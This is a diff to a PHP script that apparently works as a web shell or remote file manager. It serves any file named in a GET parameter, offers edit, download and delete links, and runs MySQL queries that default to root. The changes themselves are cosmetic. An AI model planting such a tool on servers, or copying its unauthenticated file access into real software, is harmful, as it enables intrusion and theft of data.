@@ -58,7 +58,8 @@ $html_footer = '<body></html>';
 $css = '<style>* {font-family: monospace, sans-serif;font-size: 11px;background-color: #fff;}
 .green {color: #048839;}.red {color:red;}.bold{font-weight: bold}.hdr{display:block;width:100%;padding:5px; text-align:center;}
 .statusbar {position:fixed;bottom:0;width:100%;background-color: #eee; border-top: 1px solid #ccc;margin:0;padding:4px; height:12px;}
-.text {font-family: Arial, sans-serif;font-size: 12px;}table td {padding: 0px 15px 0px 15px;}a {text-decoration: none;}a.plus {font-weight: bold;color: #aaa;}a.linkdir {text-decoration: none;color: #55f;min-height: 32px;}a.menu {font-weight: bold;font-size: 11px;color: #55f;}</style>';
+.text {font-family: Arial, sans-serif;font-size: 12px;}table td {padding: 0px 15px 0px 15px;}a {text-decoration: none;}a.plus {font-weight: bold;color: #aaa;}a.linkdir {text-decoration: none;color: #55f;min-height: 32px;}a.menu {font-weight: bold;font-size: 11px;color: #55f;}
+input[type="button"],input[type="submit"],button,select {border:1px solid #000; background-color:#eee;height:22px;font-weight:bold;}input[type="text"],input[type="password"],textarea{min-height:22px;border:1px solid #000;}</style>';
 
 $system_drives = IS_WIN ? system_drives() : '';
 $lf = "\n";
@@ -149,9 +150,12 @@ if (isset($_GET['d']) && isset($_GET['v']))
 	if (file_exists($_GET['v']))
 	{
 		echo '<html>
-		<style>html,body{margin:0;}textarea{width:100%;height:100%;margin:0;border:0;resize:none;outline:none;}</style>
-		<body><textarea name="file_contents" readonly="readonly">'. htmlentities(file_get_contents($_GET['v'])) .'</textarea></body>
-		</html>';
+		<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/styles/ir_black.min.css">
+		<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/highlight.min.js"></script>
+		<body style="margin:0">
+		<script>hljs.initHighlightingOnLoad();</script>
+		<pre style="margin:0"><code>'. htmlentities(file_get_contents($_GET['v'])) .'</code></pre>
+		</body></html>';
 		die;
 	}
 	else die('File not found.');
@@ -519,7 +523,7 @@ if (MODE == 'browser')
 		echo '<td>'. utf8_decode($val) .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .'</td>';
 
 		echo '<td>'. (!$is_dir ? 
-			'<a target="_blank" title="View" href="#" onclick="javascript:window.open(\''. $view .'\', \'\', \'width=550,height=700,toolbar=no,titlebar=no,location=no,scrollbars=no\'); return false;">'. $link_view .'</a> '.
+			'<a target="_blank" title="View" href="#" onclick="javascript:window.open(\''. $view .'\', \'\', \'width=550,height=700,toolbar=no,titlebar=no,location=no,scrollbars=yes\'); return false;">'. $link_view .'</a> '.
 			'<a target="_blank" title="Edit" href="#" onclick="javascript:window.open(\''. $edit .'\', \'\', \'width=550,height=700,toolbar=no,titlebar=no,location=no,scrollbars=no\'); return false;">'. $link_edit .'</a> '.
 			'<a title="Save"   href="'. $down .'">'. $link_down .'</a> '.
 			'<a title="Delete" href="'. $dele .'">'. $link_dele .'</a> ' : '&nbsp;') .'</td>';
@@ -539,18 +543,18 @@ if (MODE == 'mysql')
 	echo '<form action="" method="post">
 	Database IP / Hostname <input type=text name="db_host" value="'. (isset($_POST['db_host']) ? $_POST['db_host'] : '127.0.0.1') .'" size="15">
 	Database User <input type="text" name="db_user" value="'. (isset($_POST['db_user']) ? $_POST['db_user'] : 'root') .'" size="10">
-	Database Pass <input type="password" name="db_pass" value="'. (isset($_POST['db_pass']) ? $_POST['db_pass'] : '') .'" size="10">
+	Database Pass <input type="password" name="db_pass" autocomplete=off value="'. (isset($_POST['db_pass']) ? $_POST['db_pass'] : '') .'" size="10">
 	<input type="submit" name="db_list" value="List databases">';
 
 	if (isset($_POST['db_list']) or isset($_POST['db_run']))
 	{
-		$link = mysql_connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass']);
+		$link = @mysql_connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass']);
 
 		if (!$link) die('<p><span style="color: red">Error: '. mysql_error() .'</span></p>');
 		
 		else
 		{
-			$list_db = mysql_list_dbs($link);
+			$list_db = @mysql_list_dbs($link);
 		
 			echo '<br>MySQL query in database <select name="db_name">';
 		
@@ -586,7 +590,7 @@ if (MODE == 'mysql')
 						
 						array_push($all[$key], $val);
 						
-						if (max(strlen($key), strlen($val)) > $all['hdr'][$key])
+						if (max(strlen($key), strlen($val)) > @$all['hdr'][$key])
 							$all['hdr'][$key] = max(strlen($key), strlen($val));
 					}
 				}
